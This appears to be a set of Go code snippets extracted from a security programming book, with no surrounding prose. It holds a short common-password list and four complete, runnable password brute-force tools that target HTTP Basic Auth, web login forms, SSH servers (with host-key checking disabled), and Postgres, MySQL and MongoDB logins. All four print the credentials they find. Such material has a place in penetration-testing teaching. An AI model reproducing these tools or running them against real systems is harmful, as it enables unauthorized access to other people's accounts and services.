["```go\nhttp://username:password@www.example.com\n```", "```go\nAuthorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=\n```", "```go\npassword\n123456\nqwerty\nabc123\niloveyou\nadmin\npassw0rd\n```", "```go\npackage main \n\nimport ( \n   \"bufio\" \n   \"fmt\" \n   \"log\" \n   \"net/http\" \n   \"os\" \n) \n\nfunc printUsage() { \n   fmt.Println(os.Args[0] + ` - Brute force HTTP Basic Auth \n\nPasswords should be separated by newlines. \nURL should include protocol prefix. \n\nUsage: \n  ` + os.Args[0] + ` <username> <pwlistfile> <url> \n\nExample: \n  ` + os.Args[0] + ` admin passwords.txt https://www.test.com \n`) \n} \n\nfunc checkArgs() (string, string, string) { \n   if len(os.Args) != 4 { \n      log.Println(\"Incorrect number of arguments.\") \n      printUsage() \n      os.Exit(1) \n   } \n\n   // Username, Password list filename, URL \n   return os.Args[1], os.Args[2], os.Args[3] \n} \n\nfunc testBasicAuth(url, username, password string, doneChannel chan bool) { \n   client := &http.Client{} \n   request, err := http.NewRequest(\"GET\", url, nil) \n   request.SetBasicAuth(username, password) \n\n   response, err := client.Do(request) \n   if err != nil { \n      log.Fatal(err) \n   } \n   if response.StatusCode == 200 { \n      log.Printf(\"Success!\\nUser: %s\\nPassword: %s\\n\", username,   \n         password) \n      os.Exit(0) \n    } \n    doneChannel <- true \n} \n\nfunc main() { \n   username, pwListFilename, url := checkArgs() \n\n   // Open password list file \n   passwordFile, err := os.Open(pwListFilename) \n   if err != nil { \n      log.Fatal(\"Error opening file. \", err) \n   } \n   defer passwordFile.Close() \n\n   // Default split method is on newline (bufio.ScanLines) \n   scanner := bufio.NewScanner(passwordFile) \n\n   doneChannel := make(chan bool) \n   numThreads := 0 \n   maxThreads := 2 \n\n   // Check each password against url \n   for scanner.Scan() { \n      numThreads += 1 \n\n      password := scanner.Text() \n      go testBasicAuth(url, username, password, doneChannel) \n\n      // If max threads reached, wait for one to finish before continuing \n      if numThreads >= maxThreads { \n         <-doneChannel \n         numThreads -= 1 \n      } \n   } \n\n   // Wait for all threads before repeating and fetching a new batch \n   for numThreads > 0 { \n      <-doneChannel \n      numThreads -= 1 \n   } \n} \n```", "```go\npackage main \n\nimport ( \n   \"bufio\" \n   \"bytes\" \n   \"fmt\" \n   \"log\" \n   \"net/http\" \n   \"os\" \n) \n\nfunc printUsage() { \n   fmt.Println(os.Args[0] + ` - Brute force HTTP Login Form \n\nPasswords should be separated by newlines. \nURL should include protocol prefix. \nYou must identify the form's post URL and username and password   \nfield names and pass them as arguments. \n\nUsage: \n  ` + os.Args[0] + ` <pwlistfile> <login_post_url> ` + \n      `<username> <username_field> <password_field> \n\nExample: \n  ` + os.Args[0] + ` passwords.txt` +\n      ` https://test.com/login admin username password \n`) \n} \n\nfunc checkArgs() (string, string, string, string, string) { \n   if len(os.Args) != 6 { \n      log.Println(\"Incorrect number of arguments.\") \n      printUsage() \n      os.Exit(1) \n   } \n\n   // Password list, Post URL, username, username field, \n   // password field \n   return os.Args[1], os.Args[2], os.Args[3], os.Args[4], os.Args[5] \n} \n\nfunc testLoginForm( \n   url, \n   userField, \n   passField, \n   username, \n   password string, \n   doneChannel chan bool, \n) \n{ \n   postData := userField + \"=\" + username + \"&\" + passField + \n      \"=\" + password \n   request, err := http.NewRequest( \n      \"POST\", \n      url, \n      bytes.NewBufferString(postData), \n   ) \n   client := &http.Client{} \n   response, err := client.Do(request) \n   if err != nil { \n      log.Println(\"Error making request. \", err) \n   } \n   defer response.Body.Close() \n\n   body := make([]byte, 5000) // ~5k buffer for page contents \n   response.Body.Read(body) \n   if bytes.Contains(body, []byte(\"ERROR\")) { \n      log.Println(\"Error found on website.\") \n   } \n   log.Printf(\"%s\", body) \n\n   if bytes.Contains(body,[]byte(\"ERROR\")) || response.StatusCode != 200 { \n      // Error on page or in response code \n   } else { \n      log.Println(\"Possible success with password: \", password) \n      // os.Exit(0) // Exit on success? \n   } \n\n   doneChannel <- true \n} \n\nfunc main() { \n   pwList, postUrl, username, userField, passField := checkArgs() \n\n   // Open password list file \n   passwordFile, err := os.Open(pwList) \n   if err != nil { \n      log.Fatal(\"Error opening file. \", err) \n   } \n   defer passwordFile.Close() \n\n   // Default split method is on newline (bufio.ScanLines) \n   scanner := bufio.NewScanner(passwordFile) \n\n   doneChannel := make(chan bool) \n   numThreads := 0 \n   maxThreads := 32 \n\n   // Check each password against url \n   for scanner.Scan() { \n      numThreads += 1 \n\n      password := scanner.Text() \n      go testLoginForm( \n         postUrl, \n         userField, \n         passField, \n         username, \n         password, \n         doneChannel, \n      ) \n\n      // If max threads reached, wait for one to finish before  \n      //continuing \n      if numThreads >= maxThreads { \n         <-doneChannel \n         numThreads -= 1 \n      } \n   } \n\n   // Wait for all threads before repeating and fetching a new batch \n   for numThreads > 0 { \n      <-doneChannel \n      numThreads -= 1 \n   } \n} \n```", "```go\ngo get golang.org/x/crypto/ssh\n```", "```go\npackage main \n\nimport ( \n   \"bufio\" \n   \"fmt\" \n   \"log\" \n   \"os\" \n\n   \"golang.org/x/crypto/ssh\" \n) \n\nfunc printUsage() { \n   fmt.Println(os.Args[0] + ` - Brute force SSH Password \n\nPasswords should be separated by newlines. \nURL should include hostname or ip with port number separated by colon \n\nUsage: \n  ` + os.Args[0] + ` <username> <pwlistfile> <url:port> \n\nExample: \n  ` + os.Args[0] + ` root passwords.txt example.com:22 \n`) \n} \n\nfunc checkArgs() (string, string, string) { \n   if len(os.Args) != 4 { \n      log.Println(\"Incorrect number of arguments.\") \n      printUsage() \n      os.Exit(1) \n   } \n\n   // Username, Password list filename, URL \n   return os.Args[1], os.Args[2], os.Args[3] \n} \n\nfunc testSSHAuth(url, username, password string, doneChannel chan bool) { \n   sshConfig := &ssh.ClientConfig{ \n      User: username, \n      Auth: []ssh.AuthMethod{ \n         ssh.Password(password), \n      }, \n      // Do not check server key \n      HostKeyCallback: ssh.InsecureIgnoreHostKey(), \n\n      // Or, set the expected ssh.PublicKey from remote host \n      //HostKeyCallback: ssh.FixedHostKey(pubkey), \n   } \n\n   _, err := ssh.Dial(\"tcp\", url, sshConfig) \n   if err != nil { \n      // Print out the error so we can see if it is just a failed   \n      // auth or if it is a connection/name resolution problem. \n      log.Println(err) \n   } else { // Success \n      log.Printf(\"Success!\\nUser: %s\\nPassword: %s\\n\", username,   \n      password) \n      os.Exit(0) \n   } \n\n   doneChannel <- true // Signal another thread spot has opened up \n} \n\nfunc main() { \n\n   username, pwListFilename, url := checkArgs() \n\n   // Open password list file \n   passwordFile, err := os.Open(pwListFilename) \n   if err != nil { \n      log.Fatal(\"Error opening file. \", err) \n   } \n   defer passwordFile.Close() \n\n   // Default split method is on newline (bufio.ScanLines) \n   scanner := bufio.NewScanner(passwordFile) \n\n   doneChannel := make(chan bool) \n   numThreads := 0 \n   maxThreads := 2 \n\n   // Check each password against url \n   for scanner.Scan() { \n      numThreads += 1 \n\n      password := scanner.Text() \n      go testSSHAuth(url, username, password, doneChannel) \n\n      // If max threads reached, wait for one to finish before continuing \n      if numThreads >= maxThreads { \n         <-doneChannel \n         numThreads -= 1 \n      } \n   } \n\n   // Wait for all threads before repeating and fetching a new batch \n   for numThreads > 0 { \n      <-doneChannel \n      numThreads -= 1 \n   } \n} \n```", "```go\npackage main \n\nimport ( \n   \"database/sql\" \n   \"log\" \n   \"time\" \n\n   // Underscore means only import for \n   // the initialization effects. \n   // Without it, Go will throw an \n   // unused import error since the mysql+postgres \n   // import only registers a database driver \n   // and we use the generic sql.Open() \n   \"bufio\" \n   \"fmt\" \n   _ \"github.com/go-sql-driver/mysql\" \n   _ \"github.com/lib/pq\" \n   \"gopkg.in/mgo.v2\" \n   \"os\" \n) \n\n// Define these at the package level since they don't change, \n// so we don't have to pass them around between functions \nvar ( \n   username string \n   // Note that some databases like MySQL and Mongo \n   // let you connect without specifying a database name \n   // and the value will be omitted when possible \n   dbName        string \n   host          string \n   dbType        string \n   passwordFile  string \n   loginFunc     func(string) \n   doneChannel   chan bool \n   activeThreads = 0 \n   maxThreads    = 10 \n) \n\nfunc loginPostgres(password string) { \n   // Create the database connection string \n   // postgres://username:password@host/database \n   connStr := \"postgres://\" \n   connStr += username + \":\" + password \n   connStr += \"@\" + host + \"/\" + dbName \n\n   // Open does not create database connection, it waits until \n   // a query is performed \n   db, err := sql.Open(\"postgres\", connStr) \n   if err != nil { \n      log.Println(\"Error with connection string. \", err) \n   } \n\n   // Ping will cause database to connect and test credentials \n   err = db.Ping() \n   if err == nil { // No error = success \n      exitWithSuccess(password) \n   } else { \n      // The error is likely just an access denied, \n      // but we print out the error just in case it \n      // is a connection issue that we need to fix \n      log.Println(\"Error authenticating with Postgres. \", err) \n   } \n   doneChannel <- true \n} \n\nfunc loginMysql(password string) { \n   // Create database connection string \n   // user:password@tcp(host)/database?charset=utf8 \n   // The database name is not required for a MySQL \n   // connection so we leave it off here. \n   // A user may have access to multiple databases or \n   // maybe we do not know any database names \n   connStr := username + \":\" + password \n   connStr += \"@tcp(\" + host + \")/\" // + dbName \n   connStr += \"?charset=utf8\" \n\n   // Open does not create database connection, it waits until \n   // a query is performed \n   db, err := sql.Open(\"mysql\", connStr) \n   if err != nil { \n      log.Println(\"Error with connection string. \", err) \n   } \n\n   // Ping will cause database to connect and test credentials \n   err = db.Ping() \n   if err == nil { // No error = success \n      exitWithSuccess(password) \n   } else { \n      // The error is likely just an access denied, \n      // but we print out the error just in case it \n      // is a connection issue that we need to fix \n      log.Println(\"Error authenticating with MySQL. \", err) \n   } \n   doneChannel <- true \n} \n\nfunc loginMongo(password string) { \n   // Define Mongo connection info \n   // mgo does not use the Go sql driver like the others \n   mongoDBDialInfo := &mgo.DialInfo{ \n      Addrs:   []string{host}, \n      Timeout: 10 * time.Second, \n      // Mongo does not require a database name \n      // so it is omitted to improve auth chances \n      //Database: dbName, \n      Username: username, \n      Password: password, \n   } \n   _, err := mgo.DialWithInfo(mongoDBDialInfo) \n   if err == nil { // No error = success \n      exitWithSuccess(password) \n   } else { \n      log.Println(\"Error connecting to Mongo. \", err) \n   } \n   doneChannel <- true \n} \n\nfunc exitWithSuccess(password string) { \n   log.Println(\"Success!\") \n   log.Printf(\"\\nUser: %s\\nPass: %s\\n\", username, password) \n   os.Exit(0) \n} \n\nfunc bruteForce() { \n   // Load password file \n   passwords, err := os.Open(passwordFile) \n   if err != nil { \n      log.Fatal(\"Error opening password file. \", err) \n   } \n\n   // Go through each password, line-by-line \n   scanner := bufio.NewScanner(passwords) \n   for scanner.Scan() { \n      password := scanner.Text() \n\n      // Limit max goroutines \n      if activeThreads >= maxThreads { \n         <-doneChannel // Wait \n         activeThreads -= 1 \n      } \n\n      // Test the login using the specified login function \n      go loginFunc(password) \n      activeThreads++ \n   } \n\n   // Wait for all threads before returning \n   for activeThreads > 0 { \n      <-doneChannel \n      activeThreads -= 1 \n   } \n} \n\nfunc checkArgs() (string, string, string, string, string) { \n   // Since the database name is not required for Mongo or Mysql \n   // Just set the dbName arg to anything. \n   if len(os.Args) == 5 && \n      (os.Args[1] == \"mysql\" || os.Args[1] == \"mongo\") { \n      return os.Args[1], os.Args[2], os.Args[3], os.Args[4],   \n      \"IGNORED\" \n   } \n   // Otherwise, expect all arguments. \n   if len(os.Args) != 6 { \n      printUsage() \n      os.Exit(1) \n   } \n   return os.Args[1], os.Args[2], os.Args[3], os.Args[4], os.Args[5] \n} \n\nfunc printUsage() { \n   fmt.Println(os.Args[0] + ` - Brute force database login  \n\nAttempts to brute force a database login for a specific user with  \na password list. Database name is ignored for MySQL and Mongo, \nany value can be provided, or it can be omitted. Password file \nshould contain passwords separated by a newline. \n\nDatabase types supported: mongo, mysql, postgres \n\nUsage: \n  ` + os.Args[0] + ` (mysql|postgres|mongo) <pwFile>` +\n     ` <user> <host>[:port] <dbName> \n\nExamples: \n  ` + os.Args[0] + ` postgres passwords.txt nanodano` +\n      ` localhost:5432  myDb   \n  ` + os.Args[0] + ` mongo passwords.txt nanodano localhost \n  ` + os.Args[0] + ` mysql passwords.txt nanodano localhost`) \n} \n\nfunc main() { \n   dbType, passwordFile, username, host, dbName = checkArgs() \n\n   switch dbType { \n   case \"mongo\": \n       loginFunc = loginMongo \n   case \"postgres\": \n       loginFunc = loginPostgres \n   case \"mysql\": \n       loginFunc = loginMysql \n   default: \n       fmt.Println(\"Unknown database type: \" + dbType) \n       fmt.Println(\"Expected: mongo, postgres, or mysql\") \n       os.Exit(1) \n   } \n\n   doneChannel = make(chan bool) \n   bruteForce() \n} \n```"]